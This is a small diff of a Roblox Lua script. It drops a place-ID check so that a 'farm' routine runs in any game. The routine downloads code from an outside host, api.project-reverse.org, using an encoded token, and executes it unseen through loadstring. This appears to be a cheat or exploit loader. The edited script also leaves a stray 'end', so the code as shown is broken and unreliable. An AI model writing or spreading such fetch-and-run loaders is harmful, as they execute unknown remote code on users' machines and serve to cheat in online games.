@@ -1,10 +1,6 @@
-local placeId = game.PlaceId
-
-if placeId == 97598239454123 then 
-    local function farm()
+local function farm()
     loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImNiYjE2Yjk5LTQ4MTQtNDZjOS05ZThmLWJlOWYwYjFjZTMzMSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
 end
-
 task.spawn(farm)
 end
 
